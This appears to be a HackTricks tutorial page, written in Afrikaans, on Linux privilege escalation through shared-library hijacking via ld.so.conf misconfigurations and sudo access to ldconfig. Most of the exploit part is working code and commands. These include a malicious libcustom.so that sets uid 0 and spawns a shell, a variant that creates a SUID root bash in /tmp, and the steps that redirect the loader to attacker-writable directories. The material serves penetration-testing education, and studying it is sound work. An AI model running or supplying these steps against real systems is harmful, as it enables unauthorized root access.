# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Berei die omgewing voor

In die volgende afdeling kan jy die kode vind van die lêers wat ons gaan gebruik om die omgewing voor te berei

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Skep** daardie lêers op jou masjien in dieselfde vouer
2. **Kompileer** die **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die kas: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompileer** die **executerbare**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Gaan die omgewing na

Gaan na dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre kan **uitvoer**.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nuttige triage-opdragte

Wanneer jy ’n regte teiken aanval, verifieer die **presiese biblioteeknaam** wat die binary nodig het en wat die loader **tans oplos**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
’n Paar nuttige fynskerpunte:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` werk gewoonlik **nie** omdat
die omleiding deur jou huidige shell gedoen word. Gebruik
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` in plaas daarvan.
- **SUID/privileged** binaries ignoreer `LD_LIBRARY_PATH`/`LD_PRELOAD` in
**secure-execution mode**, maar gidse wat uit `/etc/ld.so.conf` kom, is
steeds deel van die vertroude loader-konfigurasie, so hierdie misconfiguratie kan
steeds privileged programmes beïnvloed.
- Op nuwer glibc-weergawes stel die dynamic loader ook
`--list-diagnostics` bloot, wat handig is om cache-resolusie en
`glibc-hwcaps` subgids-keuse te debug wanneer ’n hijack nie optree soos
verwag word nie.

## Exploit

In hierdie scenario gaan ons veronderstel dat **iemand ’n kwesbare entry geskep het** binne ’n lêer in _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare vouer is _/home/ubuntu/lib_ (waar ons skryf-toegang het).\
**Laai af en kompileer** die volgende kode binne daardie pad:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
As jy verwag dat **root** (of ’n ander bevoorregte rekening) later die kwesbare binêre sal uitvoer, is dit gewoonlik beter om ’n **root-owned artifact** agter te laat in plaas daarvan om ’n interaktiewe shell te spawn. Byvoorbeeld:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dan, nadat die bevoorregte uitvoering gebeur het, kan jy `/tmp/rootbash -p` gebruik.

Noudat ons die **kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde** pad geskep het, moet ons wag vir ’n **herbegin** of vir die root-gebruiker om **`ldconfig`** uit te voer (_in geval jy hierdie binary as **sudo** kan uitvoer of dit die **suid bit** het, sal jy dit self kan uitvoer_).

Sodra dit gebeur het, **kontroleer weer** van waar af die `sharedvuln` executable die `libcustom.so` biblioteek laai:_
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos jy kan sien, **dit laai dit vanaf `/home/ubuntu/lib`** en as enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Let daarop dat ons in hierdie voorbeeld nie privileges verhoog het nie, maar deur die opdragte wat uitgevoer word te wysig en **te wag vir root of ’n ander bevoorregte gebruiker om die kwesbare binary uit te voer**, sal ons in staat wees om privileges te verhoog.

### Other misconfigurations - Same vuln

In die vorige voorbeeld het ons ’n misconfiguratie nageboots waar ’n administrator **’n nie-bevoorregte folder binne ’n config file binne `/etc/ld.so.conf.d/` ingestel het**.\
Maar daar is ander misconfigurations wat dieselfde vulnerability kan veroorsaak; as jy **write permissions** het in ’n **config file** binne `/etc/ld.so.conf.d`s, in die folder `/etc/ld.so.conf.d`, of in die file `/etc/ld.so.conf`, kan jy dieselfde vulnerability konfigureer en dit exploit.

## Exploit 2

**Veronderstel jy het sudo privileges oor `ldconfig`**.\
Jy kan `ldconfig` aandui **waar om die conf files vanaf te load**, sodat ons voordeel daaruit kan trek om `ldconfig` arbitrêre folders te laat load.\
So, laat ons die files en folders skep wat nodig is om `"/tmp"` te load:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nou, soos aangedui in die **vorige exploit**, **skep die kwaadwillige library binne `/tmp`**.\
En laastens, kom ons laai die path en kyk vanwaar die binary die library laai:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos jy kan sien, met sudo-voorregte oor `ldconfig` kan jy dieselfde kwesbaarheid uitbuit.**



## Verwysings

- [ld.so(8) - Linux handleiding bladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux handleiding bladsy](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
